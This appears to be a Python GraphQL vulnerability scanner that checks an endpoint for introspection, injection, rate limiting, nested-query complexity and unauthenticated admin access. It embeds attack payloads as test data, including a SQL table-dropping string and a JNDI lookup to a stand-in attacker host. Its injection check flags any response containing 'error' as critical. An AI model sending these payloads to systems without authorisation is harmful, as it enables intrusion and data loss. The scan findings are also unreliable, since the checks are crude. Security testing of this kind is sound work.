from typing import Dict, List, Optional
import requests
import json

class GraphQLScanner:
    def __init__(self):
        self.endpoint = None
        self.schema = None
    
    def scan(self, graphql_endpoint: str, schema: Optional[str] = None) -> List[Dict]:
        vulnerabilities = []
        self.endpoint = graphql_endpoint
        
        if schema:
            self.schema = schema
        else:
            self.schema = self._introspect_schema()
        
        vulnerabilities.extend(self._test_query_injection())
        vulnerabilities.extend(self._test_schema_enumeration())
        vulnerabilities.extend(self._test_rate_limiting())
        vulnerabilities.extend(self._test_complexity_attacks())
        vulnerabilities.extend(self._test_authentication_bypass())
        
        return vulnerabilities
    
    def _introspect_schema(self) -> Dict:
        query = '''
        query IntrospectionQuery {
            __schema {
                types {
                    name
                    kind
                    fields {
                        name
                        type {
                            name
                            kind
                        }
                    }
                }
            }
        }
        '''
        
        try:
            response = requests.post(
                self.endpoint,
                json={"query": query},
                timeout=10
            )
            return response.json()
        except Exception:
            return {}
    
    def _test_query_injection(self) -> List[Dict]:
        vulnerabilities = []
        
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "${jndi:ldap://attacker.com}",
        ]
        
        for payload in injection_payloads:
            query = f'''
            query {{
                users(filter: "{payload}") {{
                    id
                    name
                }}
            }}
            '''
            
            try:
                response = requests.post(
                    self.endpoint,
                    json={"query": query},
                    timeout=10
                )
                
                response_text = response.text.lower()
                
                if "error" in response_text or "syntax" in response_text:
                    vulnerabilities.append({
                        'type': 'GraphQL Query Injection',
                        'severity': 'Critical',
                        'description': 'GraphQL endpoint vulnerable to query injection',
                        'evidence': f'Payload: {payload}'
                    })
                    break
            
            except Exception:
                pass
        
        return vulnerabilities
    
    def _test_schema_enumeration(self) -> List[Dict]:
        vulnerabilities = []
        
        if self.schema and len(self.schema) > 0:
            vulnerabilities.append({
                'type': 'GraphQL Schema Introspection Enabled',
                'severity': 'Medium',
                'description': 'GraphQL introspection is publicly accessible',
                'evidence': 'Full schema can be enumerated'
            })
        
        return vulnerabilities
    
    def _test_rate_limiting(self) -> List[Dict]:
        vulnerabilities = []
        
        try:
            rapid_requests = 20
            success_count = 0
            
            query = '{ __typename }'
            
            for i in range(rapid_requests):
                response = requests.post(
                    self.endpoint,
                    json={"query": query},
                    timeout=10
                )
                if response.status_code == 200:
                    success_count += 1
            
            if success_count == rapid_requests:
                vulnerabilities.append({
                    'type': 'GraphQL Lack of Rate Limiting',
                    'severity': 'Medium',
                    'description': f'All {rapid_requests} rapid requests succeeded',
                    'evidence': 'No rate limiting detected'
                })
        
        except Exception:
            pass
        
        return vulnerabilities
    
    def _test_complexity_attacks(self) -> List[Dict]:
        vulnerabilities = []
        
        complexity_query = '''
        query {
            user {
                friends {
                    friends {
                        friends {
                            friends {
                                friends {
                                    id
                                }
                            }
                        }
                    }
                }
            }
        }
        '''
        
        try:
            response = requests.post(
                self.endpoint,
                json={"query": complexity_query},
                timeout=30
            )
            
            if response.status_code == 200 and response.text:
                vulnerabilities.append({
                    'type': 'GraphQL Complexity Attack',
                    'severity': 'High',
                    'description': 'GraphQL accepts deeply nested queries',
                    'evidence': 'Complex query executed successfully'
                })
        
        except Exception:
            pass
        
        return vulnerabilities
    
    def _test_authentication_bypass(self) -> List[Dict]:
        vulnerabilities = []
        
        try:
            query = '{ admin { users { id email } } }'
            
            response = requests.post(
                self.endpoint,
                json={"query": query},
                timeout=10
            )
            
            if "admin" in response.text and response.status_code == 200:
                vulnerabilities.append({
                    'type': 'GraphQL Authentication Bypass',
                    'severity': 'Critical',
                    'description': 'Admin query accessible without authentication',
                    'evidence': 'Admin data returned without credentials'
                })
        
        except Exception:
            pass
        
        return vulnerabilities